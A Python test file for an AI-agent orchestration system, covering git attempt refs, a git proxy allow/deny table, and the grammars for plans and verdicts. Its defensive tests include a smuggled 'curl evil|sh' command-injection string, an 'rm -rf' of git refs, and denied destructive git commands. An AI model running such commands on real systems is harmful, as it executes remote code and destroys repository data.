    assert att.derive_items(GOAL) == {"A1": "greet() returns a greeting", "A2": "farewell() exists"}
    assert att.derive_items("Add a CLI. It lists todos. It deletes them.") == {
        "A1": "Add a CLI.", "A2": "It lists todos.", "A3": "It deletes them."}
    assert att.derive_items("fix it") == {"A1": "fix it"}
    # injected blocks never become items
    assert att.derive_items("do x and y\n\nLEARNED CONSTRAINTS (1)\n  1. z") == {"A1": "do x and y"}


async def test_case7_a_replan_cannot_redefine_or_renumber_an_anchor_item(db_url, tmp_path):
    """F3: the items are fixed when the effort is accepted (goal version 1). A re-plan that writes
    its own ANCHOR ITEMS (`A1: farewell() exists`) changes nothing: A1 still names greet, a step
    tagged A1 serves greet, the note is framed against greet; a made-up id is refused."""
    ws = LocalWS(tmp_path)
    _base(ws)
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)
        fixed = await orch._effort_anchor_items(eid)
        assert fixed == {"A1": "greet() returns a greeting", "A2": "farewell() exists"}
        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
        await _code(orch, eid, chan, root, _edits)
        replan = ("UNDERSTANDING: farewell left\nANCHOR ITEMS:\nA1: farewell() exists\n"
                  "PLAN:\n1. add b.py with farewell [anchor: A1]\nWON'T DO: x\nRISKS: none\n"
                  "VERDICT: KEEP 1-2")
        assert await _gate(orch, eid, chan, root, replan) is not None
        assert await orch._effort_anchor_items(eid) == fixed
        plan = await orch._effort_plan_row(eid)
        assert plan["items"] == fixed and plan["steps"][0]["anchor"] == "A1"
        await _code(orch, eid, chan, root, lambda w: w.write("b.py", f"broken {CONTENT_MARK}\n"))
        assert await _gate(orch, eid, chan, root,
                           replan.replace("KEEP 1-2", "DISCARD 1 no-solution: farewell still missing")) is not None
        notes = await _notes(orch, eid)
        assert notes and "anchor item A1 (greet() returns a greeting)" in notes[-1]
        # an id the effort does not have is refused (once, then stop)
        made_up = replan.replace("[anchor: A1]", "[anchor: A9]").replace("VERDICT: KEEP 1-2", "")
        assert await _gate(orch, eid, chan, root, made_up, made_up) is None
        assert await orch._event_count(eid, "plan_steps_undeclared") == 2
    finally:
        await _shutdown(orch, db)


# ── Case 8: refs expire at delivery ───────────────────────────────────────────────────────────
async def test_case8_attempt_refs_expire_at_delivery(db_url, tmp_path):
    ws = LocalWS(tmp_path)
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        _base(ws)
        eid, chan, root = await _effort(orch)
        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
        await _code(orch, eid, chan, root, _edits)
        await _gate(orch, eid, chan, root, _plan_next("KEEP 1,2"))
        await orch._expire_attempts(eid)
        from app.models import EffortAttempt
        async with orch.db.session_factory() as s:
            rows = (await s.execute(select(EffortAttempt).where(
                EffortAttempt.effort_id == eid))).scalars().all()
        assert rows and all(r.expired for r in rows)
        assert await orch._event_count(eid, "attempt_refs_expired") == 1
    finally:
        await _shutdown(orch, db)


# ── Case 9: the proxy table; labels; the ONE worker holding the attempt ───────────────────────
def test_case9_every_git_argv_passes_the_real_git_proxy():
    import git_proxy
    att = _a()
    table = {" ".join(a): git_proxy.classify(a) for a in att.GIT_ARGVS}
    denied = {k: (d.rule, d.reason) for k, d in table.items() if d.action != "allow"}
    assert denied == {}
    for bad in (["write-tree"], ["update-ref", "x", "y"], ["branch", "-D", "x"],
                ["-c", "a=b", "status"], ["reset", "--hard", "abc"]):
        assert git_proxy.classify(bad).action == "deny"


def _shape(att, argv):
    out = []
    for i, tok in enumerate(argv):
        if att.is_sha(tok):
            out.append("SHA")
        elif tok.startswith("refs/heads/ao-attempts/"):
            out.append("refs/heads/REF")
        elif tok.startswith("ao-attempts/"):
            out.append("REF")
        elif i > 0 and argv[i - 1] == "-m":
            out.append("MSG")
        elif i > 0 and argv[i - 1] == "--" and argv[0] == "--literal-pathspecs":
            out.append("PATH")
        elif argv[:2] == ["checkout", "-q"] and i == 2 and tok not in ("--detach", "--", "-b"):
            out.append("BRANCH")
        elif argv[:3] == ["checkout", "-q", "-b"] and i == 3:
            out.append("BRANCH")
        else:
            out.append(tok)
    return tuple(out)


async def test_case9_the_argvs_the_bridge_sent_are_exactly_the_declared_table(db_url, tmp_path):
    """Every git argv the shim logged in a scenario WITHOUT worker checks (those run the
    worker's own commands) has a declared shape, or is the unchanged check's."""
    import git_proxy
    att = _a()
    ws = LocalWS(tmp_path)

    async def no_checks(orch, ws):
        _base(ws)
        eid, chan, root = await _effort(orch)
        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
        await _code(orch, eid, chan, root, _edits)
        await _gate(orch, eid, chan, root, _plan_next("DISCARD 1 no-solution: wrong approach to A1"))
        return eid

    await _run(db_url, ws, no_checks)
    shapes = {tuple(a) for a in att.GIT_ARGVS}
    legacy = {("status", "--porcelain"), ("checkout", "--", "."), ("clean", "-fd")}
    sent = [c["argv"] for c in ws.calls()]
    assert sent
    unknown = sorted({_shape(att, a) for a in sent} - shapes - legacy)
    assert unknown == []
    for argv in legacy:
        assert git_proxy.classify(list(argv)).action == "allow"


async def test_case9_the_audit_records_a_label_not_the_command(db_url, tmp_path):
    ws = LocalWS(tmp_path)
    _base(ws)
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)
        # no worker holds the effort's workspace yet: refused, nothing runs
        assert await orch._attempt_exec(eid, f"echo {CMD_MARK}") is None
        assert orch.harness.checks == []
        await _code(orch, eid, chan, root, None)
        assert await orch._attempt_exec(eid, f"echo {CMD_MARK}", label="ao-attempt:checks")
        blob = json.dumps(await _events(orch, eid, "check_exec"))
        assert "ao-attempt:checks" in blob and CMD_MARK not in blob
    finally:
        await _shutdown(orch, db)


async def test_case9_two_workers_on_one_effort_reach_the_coding_workspace_or_none(db_url, tmp_path):
    """The plan wake can land on another pool worker focused on the same effort: attempt
    commands go to the worker of the last CODING wake, else (ambiguous) nowhere."""
    orch, db = await _orch(db_url, urls="http://w1:8090,http://w2:8090", workers=2)
    w1, w2 = LocalWS(tmp_path / "1"), LocalWS(tmp_path / "2", seed=9)
    _wire(orch, w1, {"http://w1:8090": w1, "http://w2:8090": w2})
    try:
        eid, _c, _r = await _effort(orch)
        async with orch.db.session_factory() as s:
            rows = (await s.execute(select(WorkerInstance))).scalars().all()
            ids = {r.base_url: r.id for r in rows}
            for r in rows:
                r.session_id = f"sess-{r.id}"
            await s.commit()
        for wid in ids.values():
            orch.router._ws_focus[wid] = (eid, REPO, "")
        assert await orch.router.focus_target(eid) is None             # ambiguous: fail closed
        assert await orch._attempt_exec(eid, "echo x") is None
        orch.router._coding_ws[eid] = ids["http://w2:8090"]
        assert (await orch.router.focus_target(eid))[0] == ids["http://w2:8090"]
        orch.harness.checks.clear()
        assert await orch._attempt_exec(eid, "echo hi")
        assert {c["base_url"] for c in orch.harness.checks} == {"http://w2:8090"}
    finally:
        await _shutdown(orch, db)


# ── Case 10: framing ─────────────────────────────────────────────────────────────────────────
def test_case10_records_survive_chunk_splits_and_the_extra_join_newline():
    import random
    att = _a()
    raw = att.BEGIN + "".join(f"@@N 1\t2\tdir/file_{i}.py N@@" for i in range(300)) + att.END
    for seed in range(20):
        recs = att.records(daemon_frame(raw + "\n", "", random.Random(seed)))
        assert recs is not None and len(recs) == 300
        assert recs[17] == ("N", "1\t2\tdir/file_17.py")


def test_case10_truncated_or_missing_markers_are_untrusted():
    att = _a()
    assert att.records("") is None
    assert att.records("@@HEAD x HEAD@@" + att.END) is None
    assert att.records(att.BEGIN + "@@HEAD x HEAD@@") is None
    assert att.parse_probe(att.BEGIN + "@@HEAD nothex HEAD@@@@DIRTY 0 DIRTY@@" + att.END) is None
    assert att.parse_check(att.BEGIN + "@@RCA 0 RCA@@" + att.END) is None   # incomplete


def test_case10_an_untrusted_check_is_reported_as_unknown_never_as_no_regression():
    att = _a()
    f = att.classify([{"step": 1, "cmd": "x"}], [None], [{"n": 1, "anchor": "A1"}])
    assert f["n_untrusted"] == 1 and f["checks"][0]["outcome"] == "untrusted"
    assert "UNKNOWN, not absent" in att.facts_text(f, None, [{"n": 1, "anchor": "A1"}],
                                                   [{"step": 1, "cmd": "x"}])


# ── Case 11: grammars, facts, ids, the learning record ───────────────────────────────────────
def test_case11_verdict_grammar_is_strict():
    att = _a()
    steps = {1, 2, 3}
    assert att.parse_verdict("VERDICT: KEEP 1,2", steps).steps == [1, 2]
    assert att.parse_verdict("VERDICT: KEEP steps 1 and 2", steps).steps == [1, 2]
    assert att.parse_verdict("VERDICT: KEEP 1-3", steps).steps == [1, 2, 3]
    assert att.parse_verdict("VERDICT: KEEP 1-2 - both done", steps).steps == [1, 2]
    assert att.parse_verdict("VERDICT: KEEP 1 - 2", steps).steps == [1, 2]
    assert att.parse_verdict("VERDICT: KEEP 1 - done", steps).steps == [1]
    v = att.parse_verdict("VERDICT: DISCARD 2 deviation: broke A2", steps)
    assert (v.kind, v.steps, v.klass, v.reason) == ("discard", [2], "deviation", "broke A2")
    for bad in ("", "VERDICT: KEEP 4", "VERDICT: DISCARD 1", "VERDICT: KEEP", "VERDICT: KEEP 3-1",
                "VERDICT: KEEP 1-4", "VERDICT: KEEP 1\nVERDICT: DISCARD 1 no-solution: x",
                "keep 1", "VERDICT: maybe"):
        assert att.parse_verdict(bad, steps) is None, bad


def test_case11_plan_grammar_requires_an_anchor_per_step():
    att = _a()
    d = att.parse_plan(PLAN_1)
    assert not d.problems and [s["anchor"] for s in d.steps] == ["A1", "A2"]
    assert len(att.parse_plan("PLAN:\n1. x [anchor: A9]\n2. y\n").problems) == 2
    assert att.parse_plan("PLAN:\n1. x [anchor: A1]", {"A1": "kept"}).problems == []
    assert att.parse_plan("PLAN: nothing remains").nothing_remains


def _cr(att, rca, rcb, listed=(), counts=None):
    c = {"NFA": 0, "NPA": 0, "NFB": 0, "NPB": 0, "NREG": 0, "NNEW": 0, "NSTILL": 0, "NUNK": 0,
         "NFIX": 0}
    c.update(counts or {})
    return att.CheckRun(rca=rca, rcb=rcb, counts=c, listed=list(listed), fixed=[],
                        state=att.State("a" * 40, "main", 0, None), start_checked_out=rcb is not None)


def test_case11_check_level_outcomes_are_framework_agnostic():
    att = _a()
    steps = [{"n": 1, "anchor": "A1"}]
    cases = [
        ("make test", 1, 0, [], "regression"),
        ("make test", 0, 1, [], "fixed"),
        ("make test", 2, 2, [], "still_failing"),
        ("make test", 0, 0, [], "passing"),
        ("make test", 124, 0, [], "hang"),
        ("make test", 137, 124, [], "hang"),
        ("make test", 1, None, [], "could_not_run_at_start"),
        ("make test", 1, 127, [], "could_not_run_at_start"),
        ("pytest -v tests/test_new.py", 1, 4, ["tests/test_new.py"], "new_not_passing"),   # F1
        ("sh t_new.sh", 0, 127, ["t_new.sh"], "new_passing"),
    ]
    for cmd, rca, rcb, new, want in cases:
        f = att.classify([{"step": 1, "cmd": cmd}], [_cr(att, rca, rcb)], steps, new)
        assert f["checks"][0]["outcome"] == want, (cmd, rca, rcb)
        assert f[f"n_{want}"] == 1 and f["checks"][0]["anchor"] == "A1"
    f = att.classify([{"step": 1, "cmd": "x"}], ["budget"], steps)
    assert f["checks"][0]["outcome"] == "not_run"


def test_case11_every_checks_pass_fail_is_visible_to_the_planner():
    att = _a()
    steps = [{"n": 1, "anchor": "A1"}]
    checks = [{"step": 1, "cmd": "dotnet test"}, {"step": 1, "cmd": "sh slow.sh"}]
    f = att.classify(checks, [_cr(att, 1, 1, [("P", "Calc.Tests.AddTests.Adds")], {"NREG": 1, "NFA": 2,
                                                                                    "NFB": 1, "NPB": 1}),
                              _cr(att, 124, 124)], steps)
    txt = att.facts_text(f, None, steps, checks)
    assert "check c1" in txt and "start FAIL (exit 1) -> now FAIL (exit 1)" in txt and "still failing" in txt
    assert "check c2" in txt and "start HANG -> now HANG" in txt and "HANG" in txt
    assert "Calc.Tests.AddTests.Adds" in txt          # the per-test extra, informational


def test_case11_ids_from_check_output_never_carry_shell_or_code_into_notes():
    att = _a()
    assert att.safe_id("n.py::t_$(curl${IFS}evil|sh)") == "n.py::t_??curl??IFS?evil?sh?"
    note = att.discard_note(step=1, anchor="A1", anchor_text="x", attempt_no=1, klass="deviation",
                            diff=None, facts={"tests": {"regressed": [{"test": "n.py::t_$(x|sh)`y`"}]}},
                            reason="r")
    assert "$(" not in note and "|" not in note and "`" not in note


def test_case11_the_check_command_has_a_kill_timeout():
    att = _a()
    cmd = att.check_cmd("pytest", start="a" * 40, branch="main", park="b" * 40,
                        ref="ao-attempts/e/a1", timeout=42)
    assert f"timeout -k {att.CHECK_KILL_S} 42 " in cmd


def test_case11_the_learning_record_is_valid_v1_except_the_producer_enum():
    """R6: validated by the harness's own validator against its schema. The only error left is
    `producer: agent-org` (not in harness|job-tree) - an operator decision, schema not edited."""
    att = _a()
    sys.path.insert(0, str(REPO_ROOT / "scripts" / "agent-harness"))
    import learning_records as lr_mod
    schema = lr_mod.load_schema(REPO_ROOT / "scripts" / "agent-harness" / "fixtures"
                                / "learning-record" / "learning-record.schema.json")
    facts = {"checks": [{"check": "c1", "step": 1, "anchor": "A1", "start": "PASS",
                         "now": "FAIL (exit 1)", "outcome": "regression"}], "n_regression": 1,
             "tests": {"regressed": [{"test": "t.py::a"}]}}
    rec = att.learning_record(effort_id="e1", attempt_id="e1:a1", ref="ao-attempts/e1/a1",
                              anchor="A1", anchor_text="greet", note="the note", facts=facts,
                              klass="deviation", created_at="2026-10-11T00:00:00Z")
    errs = lr_mod.validate(schema, rec)
    assert [e for e in errs if "producer" not in e[0]] == [], errs
    assert isinstance(rec["red"], str) and set(rec["source_ref"]) <= {
        "queue_item_id", "anchor_id", "merge_range", "session_id", "branch_id"}
    assert lr_mod.validate(schema, {**rec, "producer": "harness"}) == []


# ── Case 13: R2 / R4 scenarios on the framed local workspace ─────────────────────────────────
async def test_case13_two_big_suites_past_the_64kb_tail_both_regressions_reported(db_url, tmp_path):
    await _run(db_url, LocalWS(tmp_path), scenario_big_output)


async def test_case13_branch_moving_checks_cannot_move_the_kept_branch(db_url, tmp_path):
    await _run(db_url, LocalWS(tmp_path), scenario_branch_moving_checks)


async def test_case13_a_check_that_commits_cannot_survive_a_discard(db_url, tmp_path):
    await _run(db_url, LocalWS(tmp_path), scenario_branch_moving_discard)


async def test_case13_a_check_that_deletes_the_attempt_ref_fails_closed(db_url, tmp_path):
    ws = LocalWS(tmp_path)
    _base(ws)
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)
        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
        await _code(orch, eid, chan, root, _edits,
                    _checks_reply("step 1: rm -rf .git/refs/heads/ao-attempts"))
        n_wakes = len(orch.harness.wakes)
        assert await _gate(orch, eid, chan, root, _plan_next("DISCARD 1 no-solution: x for A1")) is None
        assert len(orch.harness.wakes) == n_wakes            # stopped BEFORE any plan turn
        assert await orch._event_count(eid, "worker_plan_stopped") == 1
        assert await orch._event_count(eid, "attempt_restore_failed") == 1
        assert await orch._event_count(eid, "attempt_discarded") == 0
        assert CONTENT_MARK in ws.read("a.py") and CONTENT_MARK in ws.read("b.py")   # not lost
    finally:
        await _shutdown(orch, db)


# ── Case 12: the real little-coder-open-terminal image, offline ──────────────────────────────
_REAL = [scenario_keep, scenario_discard, scenario_plan_writes, scenario_big_output,
         scenario_new_test_file, scenario_dotnet_and_shell, scenario_fail_and_hang_both_times,
         scenario_branch_moving_checks, scenario_branch_moving_discard]


@pytest.mark.skipif(not _CONTAINER, reason="set AO_ATTEMPT_OT_CONTAINER to an offline container "
                                           "of the real little-coder-open-terminal image")
@pytest.mark.parametrize("scenario", _REAL, ids=[f.__name__[9:] for f in _REAL])
async def test_case12_real_open_terminal_image(db_url, scenario):
    ws = ContainerWS(_CONTAINER, _KEY)
    await _run(db_url, ws, scenario)
    assert not any("DENIED" in json.dumps(c) for c in ws.calls())


@pytest.mark.skipif(not _CONTAINER, reason="needs AO_ATTEMPT_OT_CONTAINER")
@pytest.mark.parametrize("run", sorted(C7A_RUNS))
async def test_case12_real_image_c7a_replay(db_url, run):
    await _c7a(db_url, ContainerWS(_CONTAINER, _KEY), run)


# ── Case 16: round-3 minors ────────────────────────────────────────────────────────────────────
async def test_case16_new_test_file_checked_alone(db_url, tmp_path):
    await _run(db_url, LocalWS(tmp_path), scenario_new_test_file)


async def test_case16_dotnet_and_shell_checks(db_url, tmp_path):
    await _run(db_url, LocalWS(tmp_path), scenario_dotnet_and_shell)


async def test_case16_fail_and_hang_both_times_within_a_gate_budget(db_url, tmp_path):
    await _run(db_url, LocalWS(tmp_path), scenario_fail_and_hang_both_times)


async def test_case16_a_salvage_ref_moved_by_checkout_B_is_detected_and_repaired(db_url, tmp_path):
    """`git checkout -B <ref> <sha>` is proxy-legal (allow:checkout): run THROUGH the proxy shim
    by a later plan turn after a discard - detected, audited, pointed back at the attempt."""
    att = _a()
    ws = LocalWS(tmp_path)
    s0 = _base(ws)
    br = _branch(ws)
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)
        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
        await _code(orch, eid, chan, root, _edits)
        await _gate(orch, eid, chan, root, _plan_next("DISCARD 1 no-solution: wrong for A1"))
        ref = att.ref_name(eid, 1)
        park = ws.git("rev-parse", ref).strip()

        def plan_moves_ref(w):
            w.bridge(f"cd /workspace && git checkout -q -B {ref} {s0} && git checkout -q {br}")

        orch._plan_actions.append(plan_moves_ref)
        await _gate(orch, eid, chan, root, _plan_next(""))
        moved = await _events(orch, eid, "attempt_ref_moved")
        assert moved and moved[-1]["payload"]["ref"] == ref and moved[-1]["payload"]["repaired"] is True
        assert ws.git("rev-parse", ref).strip() == park and CONTENT_MARK in ws.git("show", f"{ref}:a.py")
        assert _branch(ws) == br and ws.git("status", "--porcelain").strip() == ""
        _no_denials(ws)
    finally:
        await _shutdown(orch, db)


async def test_case16_long_test_ids_are_compared_in_full_never_merged(db_url, tmp_path):
    """Two parametrized tests sharing a 170-char prefix: A passed at the start, B failed; both
    fail now. A is a regression, B still failing (round 2 cut ids before comparing and merged them)."""
    ws = LocalWS(tmp_path)
    _base(ws)
    pre = "t.py::test_" + "p" * 170
    ws.write("long.sh", f"echo '{pre}[A] PASSED'\necho '{pre}[B] FAILED'\nexit 1\n")
    ws.git("add", "-A")
    ws.git("commit", "-q", "-m", "long")
    orch, db = await _orch(db_url)
    _wire(orch, ws)
    try:
        eid, chan, root = await _effort(orch)
        assert await _gate(orch, eid, chan, root, PLAN_1) is not None
        facts = await _facts_after(orch, ws, eid, chan, root, lambda w: (_edits(w), w.write(
            "long.sh", f"echo '{pre}[A] FAILED'\necho '{pre}[B] FAILED'\nexit 1\n")),
            _checks_reply("step 1: sh long.sh"))
        assert facts["tests_counts"]["regressed"] == 1 and facts["tests_counts"]["still_failing"] == 1
        shown = facts["tests"]["regressed"][0]
        assert "~" in shown and len(shown) < 200
    finally:
        await _shutdown(orch, db)


async def test_case16_anchor_items_are_stored_at_intake(db_url):
    """The accepted goal (goal version 1, set at intake) fixes the items; a later goal version
    (an iteration) does not change them."""
    orch, db = await _orch(db_url)
    try:
        eid, _c, _r = await _effort(orch)
        plan = await orch._effort_plan_row(eid)
        assert plan["items"] == {"A1": "greet() returns a greeting", "A2": "farewell() exists"}
        await orch.charters.set_goal(eid, "- something else entirely", created_by="po")
        assert await orch._effort_anchor_items(eid) == plan["items"]
    finally:
        await _shutdown(orch, db)
